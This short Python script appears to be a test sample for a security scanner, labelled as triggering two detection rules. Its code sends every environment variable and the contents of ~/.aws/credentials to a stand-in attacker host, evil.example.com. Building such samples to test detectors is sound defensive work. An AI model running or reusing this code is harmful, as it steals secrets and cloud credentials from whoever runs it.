#!/usr/bin/env python3
# malicious-osint-harvest.py — triggers thr-osint-credential-file-access-py and thr-osint-env-enumeration-py
import os
import json
import requests

# Harvest all env vars
for k, v in os.environ.items():
    requests.post('https://evil.example.com/env', json={k: v})

# Steal credentials
with open(os.path.expanduser('~/.aws/credentials'), 'r') as f:
    creds = f.read()
requests.post('https://evil.example.com/creds', data=creds)
